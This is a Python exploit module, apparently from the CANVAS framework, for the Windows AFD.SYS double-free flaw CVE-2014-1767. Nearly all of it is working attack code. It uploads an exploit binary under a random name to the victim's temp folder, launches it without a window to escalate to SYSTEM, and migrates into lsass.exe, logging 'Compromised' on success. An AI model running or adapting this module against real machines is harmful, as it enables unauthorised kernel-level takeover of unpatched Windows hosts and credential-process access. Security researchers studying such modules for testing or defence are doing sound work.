#!/usr/bin/env python

import os
import sys
import random

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

NAME                           = 'AFD.SYS dangling pointer vulnerability'
DESCRIPTION                    = 'A vulnerability in AFD.SYS allows a memory kernel object to be freed twice'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2014-1767'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1767'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Windows']]
PROPERTY['VERSION']            = ['7']
DOCUMENTATION['Notes']         = """

This vulnerability affects Microsoft Windows from XP to 8.1, although the exploit
is not available for every version.

This module automatically migrates to lsass.exe.

Tested on:
Windows 7 x86

This vulnerability was found and documented by Sebastian Apelt from Siberas.
Our exploitation technique for windows 8.1 is based on his work, although for
other version vary.

See http://TODO/Pwn2own_2014_AFD.sys_privilege_escalation.pdf
"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None

        self.local_name     = 'exp.exe'
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_exp      = os.path.join(self.local_res, self.local_name)

        self.remote_path    = '%TMP%\\' # remote base path
        self.remote_name    = '%s.exe' % random.randint(0, 1000)
        self.remote_exp     = ''

        self.isX64          = False

    def spawn_exploit(self, arg1):
        try:
            dst = os.path.join(self.remote_path, self.remote_name)
            ret = self.node.shell.CreateProcessA(dst + ' ' +  arg1,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)
            if not ret:
                return False
        except Exception, ex:
            self.log('[EE] %s' % ex)
            return False

        return True

    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.node = node

            if not self.is_windows_node():
                continue

            if not self.is_32bit_node():
                continue

            # first, we check to make sure we are not
            # already local/SYSTEM
            whoami = self.exploitnodes('whoami', [self.node])[0]

            self.log('[ii] Currently running as: %s' % (whoami))
            if whoami[-1] == '$':
                self.log("[ii] It appears you are already running as LOCAL/SYSTEM")
                continue

            if not self.is_win7_node:
                continue

            self.remote_path = self.node.shell.GetTempPathA()
            if not self.remote_path:
                self.log('[EE] Could not resolve full temp dir path')
                continue
            else:
                self.log('[ii] Temp dir: %s' % self.remote_path)
                self.remote_exp = os.path.join(self.remote_path, self.remote_name)


            if self.node.shell.chdir(self.remote_path) < 0:
                self.log('[EE] Could not chdir into %s' % self.remote_path)
                continue

            # upload binaries
            if not self.nodeUpload(self.local_exp, self.remote_exp):
                self.log('[EE] Error while uploading exploit binary')
                continue

            # spawn exploit
            pid  = self.node.shell.getpid()
            arg1 = "%s" % pid

            if not self.spawn_exploit(arg1):
                self.log('[EE] Could not spawn %s' % NAME)
                continue

            # Just do a default mosdefmigrate and be done with it
            migrate = self.engine.getModuleExploit("mosdefmigrate")
            migrate.link(self)
            ret = migrate.run()

            if not ret:
                self.log("[EE] Failed to migrate to LSASS")
                self.log('[EE] %s failed' % NAME)
                ret = 0
            else:
                # just to be sure
                if self.compromised():
                    self.log("[+] Compromised")
                    ret = 1

            time.sleep(1)
            self.cleanup()

        return ret


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
